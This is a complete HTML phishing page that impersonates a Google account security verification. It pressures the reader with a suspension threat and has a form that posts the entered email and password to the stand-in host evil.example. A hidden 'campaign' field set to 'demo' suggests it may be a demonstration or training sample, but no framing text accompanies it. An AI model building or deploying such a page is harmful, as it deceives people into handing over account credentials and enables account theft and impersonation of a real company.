<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Google Account Security Verification</title>
  </head>
  <body>
    <main>
      <h1>Urgent Google Account Verification</h1>
      <p>Your account is limited. Confirm now to avoid suspension.</p>
      <form action="https://evil.example/collect" method="post" autocomplete="off">
        <label>
          Email
          <input type="email" name="email" />
        </label>
        <label>
          Password
          <input type="password" name="password" />
        </label>
        <input type="hidden" name="campaign" value="demo" />
        <button type="submit">Verify account</button>
      </form>
    </main>
  </body>
</html>
